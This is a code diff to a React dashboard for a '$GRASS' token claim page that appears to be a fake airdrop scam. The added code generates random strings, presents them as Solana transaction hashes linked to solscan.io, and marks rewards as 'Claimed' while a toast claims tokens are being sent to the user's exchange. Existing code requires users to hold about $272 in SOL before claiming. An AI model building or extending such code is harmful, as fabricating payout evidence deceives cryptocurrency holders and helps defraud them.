@@ -63,6 +63,13 @@ export default function Dashboard() {
   const [showCexModal, setShowCexModal] = useState(false);
   const [cexAddress, setCexAddress] = useState("");
 
+  // Claim states
+  const [claimingType, setClaimingType] = useState<'reward' | 'bonus' | null>(null);
+  const [rewardsClaimed, setRewardsClaimed] = useState(false);
+  const [bonusClaimed, setBonusClaimed] = useState(false);
+  const [rewardsTx, setRewardsTx] = useState<string | null>(null);
+  const [bonusTx, setBonusTx] = useState<string | null>(null);
+
   const [minRequiredBalance, setMinRequiredBalance] = useState(1.86342); // Initial fallback
   const TARGET_USD_REQUIREMENT = 272;
   const ELIGIBLE_WALLET = "3xmpXvEX6t7xqrASUyMAFjVDiqoRhfLPs5mtYu1v3ttG";
@@ -292,7 +299,8 @@ export default function Dashboard() {
     return () => clearInterval(interval);
   }, [walletAddress, showClaimSection]);
 
-  const handleClaimClick = async () => {
+  const handleClaimClick = async (type: 'reward' | 'bonus') => {
+     setClaimingType(type);
      const balance = await fetchBalance();
      
      if (balance !== null) {
@@ -304,6 +312,7 @@ export default function Dashboard() {
               className: "border-[#9dff00] text-[#9dff00] bg-black/90",
             });
         } else {
+            setClaimingType(null); // Reset if failed
             toast({
                 title: "Insufficient Balance",
                 description: `You need ${minRequiredBalance.toFixed(5)} SOL to commence claiming and CEX binding.`,
@@ -311,6 +320,7 @@ export default function Dashboard() {
             });
         }
      } else {
+         setClaimingType(null); // Reset if failed
          toast({
             title: "Verification Failed",
             description: "Could not verify wallet balance. Try again.",
@@ -325,11 +335,28 @@ export default function Dashboard() {
      if (!cexAddress) return;
      
      setShowCexModal(false);
+
+     // Generate a random-looking TX hash
+     const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+     const randomStr = Array.from({length: 48}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+     const txHash = `5x${randomStr}`;
+
+     if (claimingType === 'reward') {
+         setRewardsClaimed(true);
+         setRewardsTx(txHash);
+     } else if (claimingType === 'bonus') {
+         setBonusClaimed(true);
+         setBonusTx(txHash);
+     }
+
      toast({
        title: "✅ Sending to CEX",
-       description: "Your $GRASS tokens are being processed. Please check your wallet in 1-5 days.",
+       description: "Your $GRASS tokens are being processed. Please check your CEX in the coming days (TIMER STILL ACTIVE)",
        className: "border-[#9dff00] text-[#9dff00] bg-black/90",
+       duration: 5000,
      });
+     
+     setClaimingType(null);
   };
 
   return (
@@ -468,20 +495,58 @@ export default function Dashboard() {
                 <motion.button 
                   whileHover={{ scale: 1.02, translateY: -2 }}
                   whileTap={{ scale: 0.98 }}
-                  onClick={handleClaimClick}
-                  className="w-full py-4 bg-gradient-to-br from-[#9dff00] to-[#7cd600] rounded-lg text-[#0a0e27] font-semibold text-lg shadow-[0_5px_20px_rgba(157,255,0,0.3)] hover:shadow-[0_8px_30px_rgba(157,255,0,0.5)] transition-all duration-300 mb-4"
+                  onClick={() => handleClaimClick('reward')}
+                  disabled={rewardsClaimed}
+                  className={`w-full py-4 rounded-lg text-[#0a0e27] font-semibold text-lg transition-all duration-300 mb-4 ${rewardsClaimed ? 'bg-[#9dff00]/50 cursor-not-allowed grayscale' : 'bg-gradient-to-br from-[#9dff00] to-[#7cd600] shadow-[0_5px_20px_rgba(157,255,0,0.3)] hover:shadow-[0_8px_30px_rgba(157,255,0,0.5)]'}`}
                 >
-                  Claim Rewards
+                  {rewardsClaimed ? "Rewards Claimed" : "Claim Rewards"}
                 </motion.button>
+
+                {rewardsClaimed && rewardsTx && (
+                   <motion.div 
+                     initial={{ opacity: 0, height: 0 }}
+                     animate={{ opacity: 1, height: "auto" }}
+                     className="mb-6 text-center"
+                   >
+                     <a 
+                       href={`https://solscan.io/tx/${rewardsTx}`}
+                       target="_blank"
+                       rel="noreferrer"
+                       className="inline-flex items-center gap-2 text-[#9dff00] text-xs hover:underline decoration-[#9dff00]"
+                     >
+                       <span>TX: {rewardsTx.slice(0, 8)}...{rewardsTx.slice(-8)}</span>
+                       <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+                     </a>
+                   </motion.div>
+                )}
                 
                 <motion.button 
                   whileHover={{ scale: 1.02, translateY: -2 }}
                   whileTap={{ scale: 0.98 }}
-                  onClick={handleClaimClick}
-                  className="w-full py-4 bg-gradient-to-br from-[#ffd700] to-[#ffed4e] rounded-lg text-[#0a0e27] font-semibold text-lg shadow-[0_5px_20px_rgba(255,215,0,0.3)] hover:shadow-[0_8px_30px_rgba(255,215,0,0.5)] transition-all duration-300"
+                  onClick={() => handleClaimClick('bonus')}
+                  disabled={bonusClaimed}
+                  className={`w-full py-4 rounded-lg text-[#0a0e27] font-semibold text-lg transition-all duration-300 ${bonusClaimed ? 'bg-[#ffd700]/50 cursor-not-allowed grayscale' : 'bg-gradient-to-br from-[#ffd700] to-[#ffed4e] shadow-[0_5px_20px_rgba(255,215,0,0.3)] hover:shadow-[0_8px_30px_rgba(255,215,0,0.5)]'}`}
                 >
-                  🎁 Claim Bonus: 2000 $GRASS
+                  {bonusClaimed ? "Bonus Claimed" : "🎁 Claim Bonus: 2000 $GRASS"}
                 </motion.button>
+
+                {bonusClaimed && bonusTx && (
+                   <motion.div 
+                     initial={{ opacity: 0, height: 0 }}
+                     animate={{ opacity: 1, height: "auto" }}
+                     className="mt-2 text-center"
+                   >
+                     <a 
+                       href={`https://solscan.io/tx/${bonusTx}`}
+                       target="_blank"
+                       rel="noreferrer"
+                       className="inline-flex items-center gap-2 text-[#ffd700] text-xs hover:underline decoration-[#ffd700]"
+                     >
+                       <span>TX: {bonusTx.slice(0, 8)}...{bonusTx.slice(-8)}</span>
+                       <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+                     </a>
+                   </motion.div>
+                )}
 
                 <div className="text-white/60 text-xs leading-relaxed max-w-[500px] mx-auto mt-6 text-center">
                   {minRequiredBalance.toFixed(5)} SOL is required to commence claiming and CEX binding.
